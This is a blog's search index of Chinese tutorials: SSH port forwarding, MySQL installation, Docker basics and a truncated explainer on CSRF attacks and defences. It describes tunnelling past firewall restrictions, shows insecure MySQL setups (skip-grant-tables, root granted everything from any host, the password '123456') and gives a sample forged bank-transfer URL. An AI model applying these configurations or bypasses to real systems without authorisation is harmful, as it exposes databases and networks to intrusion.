<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[SSH隧道tunneling端口转发]]></title>
    <url>%2F2018%2F02%2F06%2FSSH%E9%9A%A7%E9%81%93tunneling%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%2F</url>
    <content type="text"><![CDATA[SSH隧道tunneling端口转发​ SSH 会自动加密和解密所有 SSH 客户端与服务端之间的网络数据。但是，SSH 还能够将其他 TCP 端口的网络数据通过SSH 链接来转发，并且自动提供了相应的加密及解密服务。这一过程也被叫做“隧道”（tunneling），这是因为 SSH 为其他TCP 链接提供了一个安全的通道来进行传输而得名。 例如，Telnet，SMTP，LDAP 这些 TCP 应用均能够从中得益，避免了用户名，密码以及隐私信息的明文传输。而与此同时，如果工作环境中的防火墙限制了一些网络端口的使用，但是允许 SSH的连接，也能够通过将 TCP 端口转发来使用 SSH 进行通讯。 SSH 端口转发能够提供两大功能：​  加密 SSH Client 端至 SSH Server 端之间的通讯数据 ​  突破防火墙的限制完成一些之前无法建立的 TCP 连接 我们来演示一个案列 ​ DEMO公司在内部有一台公司WEB服务器C，因为上面的内容是公司内部相关的，因此，只允许通过内部的B机器(代理服务器)进行访问。如果员工A想访问这台WEB服务器，只能经过防火墙认证过滤后进入内网B进行访问。 如上，我们可以认为 A 为本地， B 为跳板机， C 为远程服务器, 以下用A,B,C表示说明。我们将 C 防火墙打开， 允许外部访问， 在 C 机器上使用iptables进行策略部署 1234567891011#iptables -A INPUT -s 192.168.4.101 -j ACCEPT #iptables -A INPUT -s 192.168.4.100 -j REJECT#iptables -vnLChain INPUT (policy ACCEPT 53 packets, 4347 bytes)pkts bytes target prot opt in out source destination0 0 ACCEPT all -- * * 192.168.4.101 0.0.0.0/00 0 REJECT all -- * * 192.168.4.100 0.0.0.0/0 reject-with icmp-port-unreachable 对于centos7我们可以通过firewall来设置，想打开的端口， 如何使用firewall防火墙开放端口，在我的http://www.leijunblog.com/2018/01/06/linux%E4%B8%8B%E5%AE%89%E8%A3%85mysql/#more 这篇文档末尾有提到。 然后进行验证​ 在A上面直接访问C机器，无法连接 123#curl http://192.168.4.113curl: (7) couldn't connect to host ​ 在B上面直接访问C机器，可以正常打开网页服务 123#curl http://192.168.4.113&lt;h1&gt;Apache 2 Test Page powered by CentOS&lt;/h1&gt; 如果遇到上述情况， 我们就可以使用ssh隧道技术尝试解决方案一 &lt;本地转发&gt; 语法格式： 1234567891011-L localport:remotehost:remotehostport sshserver-L 本地端口:远程主机地址:远程主机开放端口 中转主机地址#选项：-f 后台启用-N 不打开远程shell，处于等待状态-g 表示ssh隧道对应的转发端口将监听在主机的所有IP中，不使用"-g选项"时，转发端口默认只监听在主机的本地回环地址中，"-g"表示开启网关模式，远程端口转发中，无法开启网关功能 在A上面设置本地端口转发 12345678910#ssh -L 1314:192.168.4.113:80 192.168.4.101 -Nf#当访问本机的1314的端口时，被加密后转发到192.168.4.101的ssh服务，再解密被转发到192.168.4.113:80#ss -nlLISTEN 0 128 127.0.0.1:1314 *:*#在B机器上可以看到连接了 #ss -ntESTAB 0 0 192.168.4.101:22 192.168.4.100:42678 在A上进行访问网站 12345#curl http://127.0.0.1:1314&lt;h1&gt;Apache 2 Test Page powered by CentOS&lt;/h1&gt;#成功返回网页内容 在C机器上面看到的是B的连接 1234#ss -ntESTAB 0 1 ::ffff:192.168.4.113:80 192.168.4.101:60500 #在这个场景里，A是ssh客户端，B是ssh服务器端 方案二 &lt;远程转发&gt; 语法格式： 1234567891011-R sshserverport:remotehost:remotehostport sshserver-R 本地端口:远程主机地址:远程主机开放端口 中转主机地址#选项：-f 后台启用-N 不打开远程shell，处于等待状态-g 表示ssh隧道对应的转发端口将监听在主机的所有IP中，不使用"-g选项"时，转发端口默认只监听在主机的本地回环地址中，"-g"表示开启网关模式，远程端口转发中，无法开启网关功能 在B上面设置远程端口转发 1234567#ssl -R 1314:192.168.4.113:80 192.168.4.100 -Nf# -R让192.168.4.100侦听1314端口的访问，如有访问，就加密后通过ssh服务转发请求到本机192.168.4.101ssh客户端，再由本机解密后转发到192.168.4.113:80#在A上面能看到B访问A的22端口#ss -ntESTAB 0 0 192.168.4.100:22 192.168.4.101:45830 在A上进行访问网站 12345#curl http://127.0.0.1:1314&lt;h1&gt;Apache 2 Test Page powered by CentOS&lt;/h1&gt;#成功返回网页内容 在C机器上面看到的是B的连接 1234#ss -ntFIN-WAIT-1 0 1 ::ffff:192.168.4.113:80 ::ffff:192.168.4.101:50934 # 在这个场景里，B是ssh客户端，A是ssh服务器端 方案三 &lt;动态端口转发&gt; 同时可实现 window 浏览器 通过跳转服务器 访问外网： 语法： 123#ssh -D 1080 远程主机地址#当用浏览器访问internet时，本机的XXX端口做为代理服务器，firefox的访问请求被转发到sshserver上，由sshserver替之访问internet 在A上面启用动态端口转发至B机器上 1#ssh -D 1888 192.168.4.101 -Nf 在A机器上面指定使用socks5 访问 123#curl --socks5 127.0.0.1:1888 http://192.168.4.113&lt;img src="./google.png"&gt;&lt;/img&gt; #成功返回 如果在windows 下设置： 安装git, 或者可以考虑安装一个openssh for windows xxx版本； 打开本地git-bash 123#ssh -D 1888 root@192.168.4.101 -Nf# 这里root 是跳转机用户名， 回车，根据提示输入密码， 回车 本地浏览器代理设置, 火狐为例，如下： ​ 此时你在windows 火狐浏览器的访问，都相当于通过 B 这台跳转机发出。 @本文根据51CTO博客作者[ljpwinxp]原创文章整理，链接https://blog.51cto.com/191226139/2061833]]></content>
      <categories>
        <category>network</category>
      </categories>
      <tags>
        <tag>network</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux下安装mysql]]></title>
    <url>%2F2018%2F01%2F06%2Flinux%E4%B8%8B%E5%AE%89%E8%A3%85mysql%2F</url>
    <content type="text"><![CDATA[1.安装mysql​ centOS下安装(7.0以上) 123~$:wget https://dev.mysql.com/get/mysql57-community-release-el7-11.noarch.rpm~$:sudo rpm -Uvh mysql57-community-release-el7-11.noarch.rpm~$:sudo yum install mysql-community-server ​ ubuntu下安装(16.0以上) 123~$:sudo apt-get install mysql-server~$:sudo apt install mysql-client #安装过程中提示设置密码要牢记~$:sudo apt install libmysqlclient-dev ​ 检查是否安装成功 1~$:sudo netstat -tap | grep mysql 2.登录mysql​ centOS在安装时没有设置密码,所以要先配置为无密码登录 1234567891011121314151617181920212223 ~$:vi /etc/my.cnf 在最后添加 # skip password skip-grant-tables=1 保存重启mysql服务 ~$:systemctl restart mysqld登录 ~$:mysql -u root 直接回车进入修改密码 mysql&gt;&gt;use mysql; #切换数据库 mysql&gt;&gt;desc user; # 查看用户表 mysql&gt;&gt;update user set authentication_string=password('密码') where user="root"; #修改root用户密码字段authentication_string mysql&gt;&gt;flush privileges; #刷新权限 mysql&gt;&gt;quit; #退出退出后就可以用密码登录了 ~$:mysql -u root -p ~$:password: 输入刚才设置的密码回车 ​ ubuntu在安装过程中有设置密码直接密码登录即可 12~$:mysql -u root -p~$:password: 输入安装时设置的密码回车 3.设置远程登录mysql​ centOS设置 1234567891011 ~$:mysql -u root -p ~$:password: 输入密码回车 mysql&gt;&gt;use mysql; mysql&gt;&gt;grant all privileges on *.* to ‘root’@’%’ identified by ‘远程登录密码’; mysql&gt;&gt;flush privileges; mysql&gt;&gt;exit; ~$:sudo systemctl restart mysqld.service #重启服务补充几个命令: 1、开启命令: sudo systemctl start mysqld.service 2、停止命令：sudo systemctl stop mysqld.service 3、查看状态：sudo systemctl status mysqld.service ​ ubuntu设置 12345678910~$:sudo vi /etc/mysql/mysql.conf.d/mysqld.cnf 注释掉bind-address = 127.0.0.1： 保存,退出~$:mysql -u root -p~$:password: 输入密码回车mysql&gt;&gt;use mysql;mysql&gt;&gt;grant all on *.* to root@'%' identified by '远程登录密码' with grant option;mysql&gt;&gt;flush privileges;mysql&gt;&gt;exit;~$:service mysql restart #重启服务 ​ 防火墙打开3306端口 123456打开防火墙端口 ~$:firewall-cmd --zone=public --add-port=3306/tcp --permanent重载防火墙 ~$:firewall-cmd --reload查看防火墙开启端口 ~$:firewall-cmd --zone=public --list-ports ​ 完成以上设置,可以在windows下使用navicat尝试远程连接mysql了!]]></content>
      <categories>
        <category>database</category>
      </categories>
      <tags>
        <tag>Linux下安装mysql</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[docker简易上手(2)]]></title>
    <url>%2F2017%2F08%2F03%2Fdocker%E7%AE%80%E6%98%93%E4%B8%8A%E6%89%8B(2)%20%2F</url>
    <content type="text"><![CDATA[docker简介上手(2)Docker安装Nginxdocker搭建HTTP服务器Nginx环境 12&gt; docker pull nginx&gt; 12&gt; docker container run -d -p 80:80 --rm --name mynginx nginx&gt; 参数说明: 12345&gt; &gt;-d 容器后台运行&gt; &gt;-p 映射容器端口到宿主机端口&gt; &gt;--rm 停止容器后自动删除容器&gt; &gt;--name 自定义容器名字&gt; &gt; 部署自己的页面到nginx, 使用拷贝命令将当前文件下所有的文件和文件夹拷贝到容器指定目录中(此命令也可将容器中文件拷到本地)。 12&gt;docker container cp ./index.html mynginx:/usr/local/nginx/index.html&gt; 如果不愿意拷贝, 也可以将文件夹映射到Nginx保存页面的文件目录 12&gt;docker container run -d -p 80:80 --rm --name mynginx --volume "$PWD/html":/usr/share/nginx/html nginx&gt; Docker安装MySQL下载MySQL镜像 12&gt;docker search mysql docker pull mysql:5.7 docker images&gt; 启动容器运行MySQL 12&gt;docker run --name mysql-docker -p 3306:3306 -e MYSQL_ROOT_PASSWORD=123456 -d mysql:5.7&gt; 在使用MySQL 8.x版本时可能遇到”error 2059:Authentication plugin ‘caching_sha2_password’ cannot be loaded” 的问题, 这是因为MySQL 8.x版本默认使用名为”caching_sha2_password”的机制对用户口令进行了更好的保护, 但是如果客户端没有更新有可能无法基于这种方式进行身份验证, 可以按照如下方式解决: 进入容器 12&gt; docker exec -it mysql8-docker /bin/bash&gt; 进入交互式shell之后, 可以首先利用MySQL的客户端工具进行连接MySQL服务器。 123456mysql -u root -p Enter password: Your MySQL connection id is 16 Server version: 8.0.12 MySQL Community Server - GPL Copyright (c) 2000, 2018, Oracle and/or its affiliates. All rights reserved. Oracle is a registered trademark of Oracle Corporation and/or its affiliates. Other names may be trademarks of their respective owners. Type 'help;' or '\h' for help. Type '\c' to clear the current input statement. mysql&gt; 接下来通过SQL来修改用户口令就可以了 1alter user 'root'@'%' identified with mysql_native_password by '123456' password expire never; 当然, 你也可以查看一下用户表是否修改成功: 1234567use mysql; select user, host, plugin, authentication_string from user where user='root'; +------+-----------+-----------------------+------------------------------------------+ | user | host | plugin | authentication_string | +------+-----------+-----------------------+------------------------------------------+ | root | % | mysql_native_password | *6BB4837EB74329105EE4568DDA7DC67ED2CA2AD9 | | root | localhost | mysql_native_password | *6BB4837EB74329105EE4568DDA7DC67ED2CA2AD9 | +------+-----------+-----------------------+------------------------------------------+ 2 rows in set (0.00 sec) Docker打包项目以Django项目为例 项目结构 /docker01.PNG) 将项目所需安装包定向到requirements.txt 1pip freeze &gt; requirements.txt 准备好pip.conf 镜像源文件, 如果你已经在root/.pip/pip.conf中配置好,可直接用 12345# pip.conf 内容如下(阿里源)[global]index-url = http://mirrors.aliyun.com/pypi/simple/[install]trusted-host=mirrors.aliyun.com 在运行目录下创建dockerfile文件, 写入内容如下 12345678910FROM python:3.6 # 生成镜像的基础环境, 你也可以用centos, ubuntu作为基础镜像,但比较大RUN mkdir -p /usr/src/app #镜像中项目运行的目录WORKDIR /usr/src/app #工作路径COPY pip.conf /root/.pip/pip.conf #将本地镜像源配置文件移入镜像中,这样镜像安装依赖速度会快COPY requirements.txt /usr/src/app/ #将依赖文件也复制到镜像中RUN pip install -r /usr/src/app/requirements.txt #执行命令安装依赖包RUN rm -rf /usr/src/app #执行命令删除COPY . /usr/src/app #将本地项目文件全部复制到镜像指定目录下, 别忘了 . EXPOSE 8080 #暴露容器8080端口CMD [ "python", "./manage.py", "runserver", "0.0.0.0:8080"] #容器启动命令, 运行项目 执行命令生成镜像(别忘了 . ) 123docker build -t myapp或docker build -t myapp:1.0 . #1.0为指定标记版本,如果不指定为latest 运行生成的镜像 1234# http://127.0.0.1:8080docker run -it --rm -p 8080:8080 --name mydjango myapp:1.0# 或者 http://127.0.0.1:8000（端口号随意映射，但要注意开启对应安全组）docker run -it --rm -p 8000:8080 --name mydjango myapp:1.0 将生成的镜像移植到其他机器运行 1) 导出export ; 导入import 1234docker ps -a #查看本机已有容器docker export mydjango &gt; /home/mydjango.tar # 导出# 将mydjango.tar 导入其他机器, docker要安装好docker import /home/mydjango.tar #导入容器,就可以运行啦 2)保存save; 加载load 123456docker images #查看本机已有镜像docker save [image-id] &gt; /home/myapp.tar #将镜像打成tar包# 将myapp.tar 导入其他机器, docker要安装好docker load &lt; /home/myapp.tar #这样就将镜像加载进来了,开一个容器跑起来就ok啦# 你也可以将一个正在运行的容器保存为镜像docker commit [container-id] [image-name] 3) export与save的区别 生成文件大小, export 导出的镜像小于save保存的镜像 export 是根据容器导出, 会丢失镜像历史,无法进行回滚操作; save是根据镜像导出,没有丢失镜像历史,可回滚到layer层: 12&gt; docker images --tree #查看方式&gt; 4)移除所有镜像和容器 1docker kill $(docker ps -q) ; docker rm $(docker ps -a -q) ; docker rmi $(docker images -q -a) @谢谢阅读!]]></content>
      <categories>
        <category>docker</category>
      </categories>
      <tags>
        <tag>docker</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[docker简易上手(1)]]></title>
    <url>%2F2017%2F06%2F06%2Fdocker%E7%AE%80%E6%98%93%E4%B8%8A%E6%89%8B(1)%2F</url>
    <content type="text"><![CDATA[docker简介上手(1)2013年发布至今， Docker 一直广受瞩目，被认为可能会改变软件行业。 /docker01.PNG) 那么, docker究竟是个什么神奇的东西, 他又将给将会给软件行业带来哪些好处, 解决哪些问题呢?不如随我一同了解一下! 回顾软件发展遇到的问题一、诱因大家都知道软件开发一个很麻烦的东西就是环境配置, 要想程序跑起来, 就必须满足程序运行所具备的一切条件, 比如, 你的机器上要跑一个python程序,就必须安装python的引擎, 和程序引用的所有依赖包和框架, 以及配置环境变量等! 配置环境, 会由于系统的不同,安装方法也不一样,比如windows ,mac,linux(centos与ubuntu也不完全相同)等, 甚是麻烦, 如果遇到无网环境还得源码离线编译安装, 可谓是折腾死人! 二、虚拟机虚拟机的出现在一定程度上解决了环境复制的问题, 虚拟机是带环境安装的一种解决方案, 就是在一种操作系统上运行另一种操作系统,比如在windows上运行linux系统, 虚拟机看上去就和真的操作系统一样, 对于底层系统来说, 虚拟机好像是一个文件, 而且不需要直接删除就好。 虽然虚拟机还原了原始开发环境, 但他的缺点还是显而易见的: (1) 资源占用过多; 虚拟机会独占一部分内存和硬盘空间。它运行的时候，其他程序就不能使用这些资源了。哪怕 虚拟机里面的应用程序，真正使用的内存只有 1MB，虚拟机依然需要几百 MB 的内存才能运 行。 (2)冗余步骤多; 虚拟机是完整的操作系统，一些系统级别的操作步骤，往往无法跳过，比如用户登录。 (3)启动慢; 启动操作系统需要多久，启动虚拟机就需要多久。可能要等几分钟，应用程序才能真正运行。 三、Linux容器由于虚拟机存在这些缺点，Linux 发展出了另一种虚拟化技术：Linux 容器（Linux Containers，缩写为 LXC）。 Linux 容器不是模拟一个完整的操作系统，而是对进程进行隔离。或者说，在正常进程的外 面套了一个保护层。对于容器里面的进程来说，它接触到的各种资源都是虚拟的，从而实现与 底层系统的隔离。 由于容器是进程级别的，相比虚拟机有很多优势。（1）启动快容器里面的应用，直接就是底层系统的一个进程，而不是虚拟机内部的进程。所以，启动容器 相当于启动本机的一个进程，而不是启动一个操作系统，速度就快很多。 （2）资源占用少容器只占用需要的资源，不占用那些没有用到的资源；虚拟机由于是完整的操作系统，不可避 免要占用所有资源。另外，多个容器可以共享资源，虚拟机都是独享资源。 （3）体积小容器只要包含用到的组件即可，而虚拟机是整个操作系统的打包，所以容器文件比虚拟机文件 要小很多。 总之，容器有点像轻量级的虚拟机，能够提供虚拟化的环境，但是成本开销小得多 四、Docker 是什么?Docker 属于 Linux 容器的一种封装，提供简单易用的容器使用接口。它是目前最流行的 Linux 容器解决方案。 Docker 将应用程序与该程序的依赖，打包在一个文件里面。运行这个文件，就会生成一个虚 拟容器。程序在这个虚拟容器里运行，就好像在真实的物理机上运行一样。有了 Docker，就 不用担心环境问题。 总体来说，Docker 的接口相当简单，用户可以方便地创建和使用容器，把自己的应用放入容 器。容器还可以进行版本管理、复制、分享、修改，就像管理普通的代码一样。 /docker02.PNG) 五、Docker的用途Docker 的主要用途，目前有三大类。 （1）提供一次性的环境。比如，本地测试他人的软件、持续集成的时候提供单元测试和构建 的环境。 （2）提供弹性的云服务。因为 Docker 容器可以随开随关，很适合动态扩容和缩容。 （3）组建微服务架构。通过多个容器，一台机器可以跑多个服务，因此在本机就可以模拟出 微服务架构。 六、Docker安装Docker 是一个开源的商业产品，有两个版本：社区版（Community Edition，缩写为 CE）和 企业版（Enterprise Edition，缩写为 EE）。企业版包含了一些收费服务，个人开发者一般用 不到。下面的介绍都针对社区版。 Docker CE 的安装请参考官方文档。 官方文档地址:https://docs.docker.com/ CentOS下安装使用: 确定操作系统内核版本(centos7要求64位, 内核版本3.10+; centos6要求64位,内核版本2.6+); 1uname -r 使用yum安装docker,启动 123yum -y install docker-iosystemctl start docker 查看docker信息和版本 123docker versiondocker info 运行Hello-World项目测试docker 123456docker pull library/hello-world或docker image pull library/hello-world运行docker run hello-world 运行镜像文件 123docker run &lt;image-id&gt;或docker run -p &lt;port1&gt;:&lt;port2&gt; &lt;name&gt; 查看镜像文件 123docker image ls或docker images 删除镜像文件 123docker rmi &lt;name&gt;或docker rmi &lt;image-id&gt; 查看正在运行的容器 1docker ps 停止运行的容器 123docker stop &lt;container-id&gt;或docker stop &lt;name&gt; 强制杀掉未终止容器 1docker container kill &lt;container-id&gt; Ubuntu安装使用docker(内核版本3.10+) ​ 安装如下,使用如上述基本一致 123apt updateapt install docker-ceservice docker start 更换docker国内镜像源, 提升下载速度: /etc/docker/daemon.js 123456&#123; "registry-mirrors":[ "http://hub-mirror.c.163.com", "https://registry.docker-cn.com" ]&#125; 更换其他镜像可自行网上搜索, 如阿里,清华等等。 7、Docker 命令集合 获取镜像 1docker image pull &lt;image-name&gt; 查看与拷贝 123456docker images ls #查看所有镜像docker ps #查看正在运行的docker任务docker container ls #查看正在运行的容器docker container ls --all #查看所有创建的容器,包括终止的docker container logs &lt;container-id&gt; #查看容器输出docker container cp [containID]:[/path/to/file] . #将容器中指定路径下文件拷贝到当前目录, 别忘了 . 表示当前目录 运行 123docker container run &lt;image-name&gt;或&lt;image-id&gt; #普通运行docker container run -it ubuntu bash #启动交互式shell运行ubuntu镜像er container exec -it &lt;container-id&gt; /bin/bash #进入交互式容器 停止 123docker container kill &lt;container-id&gt; #杀掉顽固容器docker container start &lt;container-id&gt; #开始容器docker container stop &lt;container-id&gt; #停止容器 删除 12docker image rmi &lt;image-id&gt; #删除镜像docker container rm &lt;container-id&gt; #删除容器 为本地image镜像标注用户名与版本 123docker image tag [imageName] [username]/[repository]:[tag] # 实例 docker image tag koa-demos:0.0.1 ruanyf/koa-demos:0.0.1 8、实例: 制作自己的Docker容器下面我以 koa-demos 项目为例，介绍怎么写 Dockerfile 文件，实现让用户在 Docker 容器里面运行 Koa 框架。 作为准备工作，请先下载源码。 123&gt; $ git clone https://github.com/ruanyf/koa-demos.git&gt; $ cd koa-demos&gt; 8.1 编写 Dockerfile 文件 首先，在项目的根目录下，新建一个文本文件.dockerignore，写入下面的内容。 1234&gt; .git&gt; node_modules&gt; npm-debug.log&gt; 上面代码表示，这三个路径要排除，不要打包进入 image 文件。如果你没有路径要排除，这个文件可以不新建。 然后，在项目的根目录下，新建一个文本文件 Dockerfile，写入下面的内容。 123456&gt; FROM node:8.4&gt; COPY . /app&gt; WORKDIR /app&gt; RUN npm install --registry=https://registry.npm.taobao.org&gt; EXPOSE 3000&gt; 上面代码一共五行，含义如下。 FROM node:8.4：该 image 文件继承官方的 node image，冒号表示标签，这里标签是8.4，即8.4版本的 node。 COPY . /app：将当前目录下的所有文件（除了.dockerignore排除的路径），都拷贝进入 image 文件的/app目录。 WORKDIR /app：指定接下来的工作路径为/app。 RUN npm install：在/app目录下，运行npm install命令安装依赖。注意，安装后所有的依赖，都将打包进入 image 文件。 EXPOSE 3000：将容器 3000 端口暴露出来， 允许外部连接这个端口。 8.2 创建 image 文件 有了 Dockerfile 文件以后，就可以使用docker image build命令创建 image 文件了。 1234&gt; $ docker image build -t koa-demo .&gt; # 或者&gt; $ docker image build -t koa-demo:0.0.1 .&gt; 上面代码中，-t参数用来指定 image 文件的名字，后面还可以用冒号指定标签。如果不指定，默认的标签就是latest。最后的那个点表示 Dockerfile 文件所在的路径，上例是当前路径，所以是一个点。 如果运行成功，就可以看到新生成的 image 文件koa-demo了。 12&gt; $ docker image ls&gt; 8.3 生成容器 docker container run命令会从 image 文件生成容器。 1234&gt; $ docker container run -p 8000:3000 -it koa-demo /bin/bash&gt; # 或者&gt; $ docker container run -p 8000:3000 -it koa-demo:0.0.1 /bin/bash&gt; 上面命令的各个参数含义如下： -p参数：容器的 3000 端口映射到本机的 8000 端口。 -it参数：容器的 Shell 映射到当前的 Shell，然后你在本机窗口输入的命令，就会传入容器。 koa-demo:0.0.1：image 文件的名字（如果有标签，还需要提供标签，默认是 latest 标签）。 /bin/bash：容器启动以后，内部第一个执行的命令。这里是启动 Bash，保证用户可以使用 Shell。 如果一切正常，运行上面的命令以后，就会返回一个命令行提示符。 12&gt; root@66d80f4aaf1e:/app#&gt; 这表示你已经在容器里面了，返回的提示符就是容器内部的 Shell 提示符。执行下面的命令。 12&gt; root@66d80f4aaf1e:/app# node demos/01.js&gt; 这时，Koa 框架已经运行起来了。打开本机的浏览器，访问 http://127.0.0.1:8000，网页显示&quot;Not Found”，这是因为这个 demo 没有写路由。 这个例子中，Node 进程运行在 Docker 容器的虚拟环境里面，进程接触到的文件系统和网络接口都是虚拟的，与本机的文件系统和网络接口是隔离的，因此需要定义容器与物理机的端口映射（map）。 现在，在容器的命令行，按下 Ctrl + c 停止 Node 进程，然后按下 Ctrl + d （或者输入 exit）退出容器。此外，也可以用docker container kill终止容器运行。 123456&gt; # 在本机的另一个终端窗口，查出容器的 ID&gt; $ docker container ls&gt; &gt; # 停止指定的容器运行&gt; $ docker container kill [containerID]&gt; 容器停止运行之后，并不会消失，用下面的命令删除容器文件。 123456&gt; # 查出容器的 ID&gt; $ docker container ls --all&gt; &gt; # 删除指定的容器文件&gt; $ docker container rm [containerID]&gt; 也可以使用docker container run命令的--rm参数，在容器终止运行后自动删除容器文件。 12&gt; $ docker container run --rm -p 8000:3000 -it koa-demo /bin/bash&gt; 8.4 CMD 命令 上一节的例子里面，容器启动以后，需要手动输入命令node demos/01.js。我们可以把这个命令写在 Dockerfile 里面，这样容器启动以后，这个命令就已经执行了，不用再手动输入了。 1234567&gt; FROM node:8.4&gt; COPY . /app&gt; WORKDIR /app&gt; RUN npm install --registry=https://registry.npm.taobao.org&gt; EXPOSE 3000&gt; CMD node demos/01.js&gt; 上面的 Dockerfile 里面，多了最后一行CMD node demos/01.js，它表示容器启动后自动执行node demos/01.js。 你可能会问，RUN命令与CMD命令的区别在哪里？简单说，RUN命令在 image 文件的构建阶段执行，执行结果都会打包进入 image 文件；CMD命令则是在容器启动后执行。另外，一个 Dockerfile 可以包含多个RUN命令，但是只能有一个CMD命令。 注意，指定了CMD命令以后，docker container run命令就不能附加命令了（比如前面的/bin/bash），否则它会覆盖CMD命令。现在，启动容器可以使用下面的命令。 12&gt; $ docker container run --rm -p 8000:3000 -it koa-demo:0.0.1&gt; 8.5 发布 image 文件 容器运行成功后，就确认了 image 文件的有效性。这时，我们就可以考虑把 image 文件分享到网上，让其他人使用。 首先，去 hub.docker.com 或 cloud.docker.com 注册一个账户。然后，用下面的命令登录。 12&gt; $ docker login&gt; 接着，为本地的 image 标注用户名和版本。 1234&gt; $ docker image tag [imageName] [username]/[repository]:[tag]&gt; # 实例&gt; $ docker image tag koa-demos:0.0.1 ruanyf/koa-demos:0.0.1&gt; 也可以不标注用户名，重新构建一下 image 文件。 12&gt; $ docker image build -t [username]/[repository]:[tag] .&gt; 最后，发布 image 文件。 12&gt; $ docker image push [username]/[repository]:[tag]&gt; 发布成功以后，登录 hub.docker.com，就可以看到已经发布的 image 文件。 @文章部分摘录于阮一峰的网络日志http://www.ruanyifeng.com/blog/2018/02/docker-tutorial.html]]></content>
      <categories>
        <category>docker</category>
      </categories>
      <tags>
        <tag>docker</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CSRF攻击与防御]]></title>
    <url>%2F2016%2F12%2F08%2FCSRF%E6%94%BB%E5%87%BB%E4%B8%8E%E9%98%B2%E5%BE%A1%2F</url>
    <content type="text"><![CDATA[CSRF概念：CSRF跨站点请求伪造(Cross—Site Request Forgery)，跟XSS攻击一样，存在巨大的危害性，你可以这样来理解： 攻击者盗用了你的身份，以你的名义发送恶意请求，对服务器来说这个请求是完全合法的，但是却完成了攻击者所期望的一个操作，比如以你的名义发送邮件、发消息，盗取你的账号，添加系统管理员，甚至于购买商品、虚拟货币转账等。 如下：其中Web A为存在CSRF漏洞的网站，Web B为攻击者构建的恶意网站，User C为Web A网站的合法用户。 CSRF攻击攻击原理 用户C打开浏览器，访问受信任网站A，输入用户名和密码请求登录网站A； 2.在用户信息通过验证后，网站A产生Cookie信息并返回给浏览器，此时用户登录网站A成功，可以正常发送请求到网站A； 用户未退出网站A之前，在同一浏览器中，打开一个TAB页访问网站B； 网站B接收到用户请求后，返回一些攻击性代码，并发出一个请求要求访问第三方站点A； 浏览器在接收到这些攻击性代码后，根据网站B的请求，在用户不知情的情况下携带Cookie信息，向网站A发出请求。网站A并不知道该请求其实是由B发起的，所以会根据用户C的Cookie信息以C的权限处理该请求，导致来自网站B的恶意代码被执行。 CSRF漏洞检测 检测CSRF漏洞是一项比较繁琐的工作，最简单的方法就是抓取一个正常请求的数据包，去掉Referer字段后再重新提交，如果该提交还有效，那么基本上可以确定存在CSRF漏洞。 随着对CSRF漏洞研究的不断深入，不断涌现出一些专门针对CSRF漏洞进行检测的工具，如CSRFTester，CSRF Request Builder等。 以CSRFTester工具为例，CSRF漏洞检测工具的测试原理如下：使用CSRFTester进行测试时，首先需要抓取我们在浏览器中访问过的所有链接以及所有的表单等信息，然后通过在CSRFTester中修改相应的表单等信息，重新提交，这相当于一次伪造客户端请求。如果修改后的测试请求成功被网站服务器接受，则说明存在CSRF漏洞，当然此款工具也可以被用来进行CSRF攻击 CSRF攻击防御（1）验证 HTTP Referer 字段 根据 HTTP 协议，在 HTTP 头中有一个字段叫 Referer，它记录了该 HTTP 请求的来源地址。在通常情况下，访问一个安全受限页面的请求来自于同一个网站，比如需要访问 http://bank.example/withdraw?account=bob&amp;amount=1000000&amp;for=Mallory，用户必须先登陆 bank.example，然后通过点击页面上的按钮来触发转账事件。这时，该转帐请求的 Referer 值就会是转账按钮所在的页面的 URL，通常是以 bank.example 域名开头的地址。而如果黑客要对银行网站实施 CSRF 攻击，他只能在他自己的网站构造请求，当用户通过黑客的网站发送请求到银行时，该请求的 Referer 是指向黑客自己的网站。因此，要防御 CSRF 攻击，银行网站只需要对于每一个转账请求验证其 Referer 值，如果是以 bank.example 开头的域名，则说明该请求是来自银行网站自己的请求，是合法的。如果 Referer 是其他网站的话，则有可能是黑客的 CSRF 攻击，拒绝该请求。 这种方法的显而易见的好处就是简单易行，网站的普通开发人员不需要操心 CSRF 的漏洞，只需要在最后给所有安全敏感的请求统一增加一个拦截器来检查 Referer 的值就可以。特别是对于当前现有的系统，不需要改变当前系统的任何已有代码和逻辑，没有风险，非常便捷。然而，这种方法并非万无一失。Referer 的值是由浏览器提供的，虽然 HTTP 协议上有明确的要求，但是每个浏览器对于 Referer 的具体实现可能有差别，并不能保证浏览器自身没有安全漏洞。使用验证 Referer 值的方法，就是把安全性都依赖于第三方（即浏览器）来保障，从理论上来讲，这样并不安全。事实上，对于某些浏览器，比如 IE6 或 FF2，目前已经有一些方法可以篡改 Referer 值。如果 bank.example 网站支持 IE6 浏览器，黑客完全可以把用户浏览器的 Referer 值设为以 bank.example 域名开头的地址，这样就可以通过验证，从而进行 CSRF 攻击。 即便是使用最新的浏览器，黑客无法篡改 Referer 值，这种方法仍然有问题。因为 Referer 值会记录下用户的访问来源，有些用户认为这样会侵犯到他们自己的隐私权，特别是有些组织担心 Referer 值会把组织内网中的某些信息泄露到外网中。因此，用户自己可以设置浏览器使其在发送请求时不再提供 Referer。当他们正常访问银行网站时，网站会因为请求没有 Referer 值而认为是 CSRF 攻击，拒绝合法用户的访问。 （2）在请求地址中添加 token 并验证 CSRF 攻击之所以能够成功，是因为黑客可以完全伪造用户的请求，该请求中所有的用户验证信息都是存在于 cookie 中，因此黑客可以在不知道这些验证信息的情况下直接利用用户自己的 cookie 来通过安全验证。要抵御 CSRF，关键在于在请求中放入黑客所不能伪造的信息，并且该信息不存在于 cookie 之中。可以在 HTTP 请求中以参数的形式加入一个随机产生的 token，并在服务器端建立一个拦截器来验证这个 token，如果请求中没有 token 或者 token 内容不正确，则认为可能是 CSRF 攻击而拒绝该请求。 这种方法要比检查 Referer 要安全一些，token 可以在用户登陆后产生并放于 session 之中，然后在每次请求时把 token 从 session 中拿出，与请求中的 token 进行比对，但这种方法的难点在于如何把 token 以参数的形式加入请求。对于 GET 请求，token 将附在请求地址之后，这样 URL 就变成 http://url?csrftoken=tokenvalue。 而对于 POST 请求来说，要在 form 的最后加上 ，这样就把 token 以参数的形式加入请求了。但是，在一个网站中，可以接受请求的地方非常多，要对于每一个请求都加上 token 